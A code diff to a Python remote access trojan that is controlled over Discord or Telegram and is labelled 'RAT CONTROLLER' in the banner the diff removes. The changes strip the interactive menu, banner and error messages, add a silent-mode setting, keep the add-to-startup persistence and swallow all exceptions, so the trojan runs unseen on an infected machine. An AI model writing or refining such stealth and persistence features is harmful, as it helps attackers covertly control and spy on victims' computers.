@@ -90,76 +90,6 @@ def keep_lock_alive():
 threading.Thread(target=keep_lock_alive, daemon=True).start()
 
 # ============================================================
-# COLORS
-# ============================================================
-
-class Colors:
-    RESET = "\033[0m"
-    RED = "\033[91m"
-    GREEN = "\033[92m"
-    YELLOW = "\033[93m"
-    BLUE = "\033[94m"
-    CYAN = "\033[96m"
-    WHITE = "\033[97m"
-    MAGENTA = "\033[95m"
-    BOLD = "\033[1m"
-
-# ============================================================
-# CLEAR SCREEN FUNCTION
-# ============================================================
-
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
-
-# ============================================================
-# STARTUP SELECTION MENU
-# ============================================================
-
-def select_delivery_method():
-    """Show menu to choose delivery method on startup"""
-    clear_screen()
-    print(f"""
-{Colors.YELLOW}╔═══════════════════════════════════════════════════════════════╗
-{Colors.YELLOW}║{Colors.WHITE}         SELECT DELIVERY METHOD                     {Colors.YELLOW}║
-{Colors.YELLOW}╚═══════════════════════════════════════════════════════════════╝
-{Colors.RESET}
-    {Colors.GREEN}[1]{Colors.WHITE} Discord Only
-    {Colors.GREEN}[2]{Colors.WHITE} Telegram Only
-    {Colors.GREEN}[3]{Colors.WHITE} Both (Discord + Telegram)
-    {Colors.GREEN}[4]{Colors.WHITE} Discord with Telegram Backup
-    {Colors.GREEN}[5]{Colors.WHITE} Telegram with Discord Backup
-    {Colors.GREEN}[6]{Colors.WHITE} Show Config Status
-""")
-    
-    choice = input(f"{Colors.CYAN}[>]{Colors.WHITE} Choice (1-6): {Colors.RESET}").strip()
-    
-    methods = {
-        "1": "discord",
-        "2": "telegram",
-        "3": "both",
-        "4": "discord_backup",
-        "5": "telegram_backup"
-    }
-    
-    if choice == "6":
-        clear_screen()
-        print(f"""
-{Colors.YELLOW}═══════════════════════════════════════════════════════════════════
-{Colors.GREEN}[+] Discord Token: {Colors.CYAN}{'✓ Set' if Config.TOKEN and Config.TOKEN != "{placeholder_token}" else '✗ Not Set'}{Colors.RESET}
-{Colors.GREEN}[+] Discord Whitelist: {Colors.CYAN}{Config.WHITELISTED if Config.WHITELISTED else 'Not Set'}{Colors.RESET}
-{Colors.GREEN}[+] Discord Channel: {Colors.CYAN}{Config.MAIN_CHANNEL if Config.MAIN_CHANNEL else 'Not Set'}{Colors.RESET}
-{Colors.GREEN}[+] Telegram Bot: {Colors.CYAN}{'✓ Set' if Config.TELEGRAM_BOT_TOKEN else '✗ Not Set'}{Colors.RESET}
-{Colors.GREEN}[+] Telegram Chat ID: {Colors.CYAN}{Config.TELEGRAM_CHAT_ID if Config.TELEGRAM_CHAT_ID else 'Not Set'}{Colors.RESET}
-{Colors.GREEN}[+] Current Delivery: {Colors.CYAN}{Config.DELIVERY_METHOD}{Colors.RESET}
-{Colors.GREEN}[+] Startup: {Colors.CYAN}{Config.STARTUP}{Colors.RESET}
-{Colors.YELLOW}═══════════════════════════════════════════════════════════════════
-""")
-        input(f"{Colors.CYAN}[>]{Colors.WHITE} Press Enter to continue...{Colors.RESET}")
-        return select_delivery_method()
-    
-    return methods.get(choice, "discord")
-
-# ============================================================
 # CONFIG
 # ============================================================
 
@@ -169,6 +99,7 @@ class Config:
     MAIN_CHANNEL = {placeholder_main_channel}
     PREFIX = "{placeholder_prefix}"
     STARTUP = {placeholder_add_to_startup}
+    SILENT = {placeholder_silent_mode}
     # Telegram config
     TELEGRAM_BOT_TOKEN = ""  # Set your bot token here
     TELEGRAM_CHAT_ID = ""    # Set your chat ID here
@@ -1566,71 +1497,17 @@ async def help_cmd(ctx):
     await ctx.send(embed=embed)
 
 # ============================================================
-# BOT RUN
+# BOT RUN - SILENT MODE (NO INTERACTIVE MENU)
 # ============================================================
 
 if __name__ == "__main__":
-    # Show startup banner
-    clear_screen()
-    print(f"""
-{Colors.YELLOW}╔═══════════════════════════════════════════════════════════════╗
-{Colors.YELLOW}║{Colors.WHITE}              RAT CONTROLLER                          {Colors.YELLOW}║
-{Colors.YELLOW}║{Colors.WHITE}         Discord / Telegram Remote Access             {Colors.YELLOW}║
-{Colors.YELLOW}╚═══════════════════════════════════════════════════════════════╝
-{Colors.RESET}
-""")
-    
-    # Let user choose delivery method
-    delivery_choice = select_delivery_method()
-    
-    # Map choice to config
-    if delivery_choice == "discord":
-        Config.DELIVERY_METHOD = "discord"
-        print(f"{Colors.GREEN}[+]{Colors.WHITE} Delivery: Discord Only{Colors.RESET}")
-    elif delivery_choice == "telegram":
-        Config.DELIVERY_METHOD = "telegram"
-        print(f"{Colors.GREEN}[+]{Colors.WHITE} Delivery: Telegram Only{Colors.RESET}")
-    elif delivery_choice == "both":
-        Config.DELIVERY_METHOD = "both"
-        print(f"{Colors.GREEN}[+]{Colors.WHITE} Delivery: Discord + Telegram{Colors.RESET}")
-    elif delivery_choice == "discord_backup":
-        Config.DELIVERY_METHOD = "discord_backup"
-        print(f"{Colors.GREEN}[+]{Colors.WHITE} Delivery: Discord (Telegram Backup){Colors.RESET}")
-    elif delivery_choice == "telegram_backup":
-        Config.DELIVERY_METHOD = "telegram_backup"
-        print(f"{Colors.GREEN}[+]{Colors.WHITE} Delivery: Telegram (Discord Backup){Colors.RESET}")
-    
-    # Show config status
-    print(f"""
-{Colors.YELLOW}───────────────────────────────────────────────────────────────
-{Colors.GREEN}[+] Discord Token: {Colors.CYAN}{'✓ Set' if Config.TOKEN and Config.TOKEN != "{placeholder_token}" else '✗ Not Set'}{Colors.RESET}
-{Colors.GREEN}[+] Discord Whitelist: {Colors.CYAN}{'✓ Set' if Config.WHITELISTED and Config.WHITELISTED[0] != "{placeholder_whitelist}" else '✗ Not Set'}{Colors.RESET}
-{Colors.GREEN}[+] Discord Channel: {Colors.CYAN}{'✓ Set' if Config.MAIN_CHANNEL and Config.MAIN_CHANNEL != "{placeholder_main_channel}" else '✗ Not Set'}{Colors.RESET}
-{Colors.GREEN}[+] Telegram Bot: {Colors.CYAN}{'✓ Set' if Config.TELEGRAM_BOT_TOKEN else '✗ Not Set'}{Colors.RESET}
-{Colors.GREEN}[+] Telegram Chat ID: {Colors.CYAN}{'✓ Set' if Config.TELEGRAM_CHAT_ID else '✗ Not Set'}{Colors.RESET}
-{Colors.GREEN}[+] Delivery Method: {Colors.CYAN}{Config.DELIVERY_METHOD}{Colors.RESET}
-{Colors.GREEN}[+] Startup: {Colors.CYAN}{Config.STARTUP}{Colors.RESET}
-{Colors.YELLOW}───────────────────────────────────────────────────────────────
-""")
-    
-    # Check for missing config
-    if Config.DELIVERY_METHOD in ["discord", "both", "discord_backup"] and (not Config.TOKEN or Config.TOKEN == "{placeholder_token}"):
-        print(f"{Colors.RED}[!] Discord token not set! Edit Config.TOKEN{Colors.RESET}")
-    if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"] and not Config.TELEGRAM_BOT_TOKEN:
-        print(f"{Colors.RED}[!] Telegram bot token not set! Edit Config.TELEGRAM_BOT_TOKEN{Colors.RESET}")
-    
-    time.sleep(2)
-    
     # Add to startup if enabled
     if Config.STARTUP:
         add_to_startup()
     
-    # Start the bot
+    # Start the bot - silent fail if error
     try:
-        if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"] and Config.TELEGRAM_BOT_TOKEN:
-            # Start Telegram bot in background (if implemented)
-            pass
         bot.run(Config.TOKEN)
     except Exception as e:
-        print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
-        input("Press Enter to exit...")
+        # Silent fail - no console output
+        pass
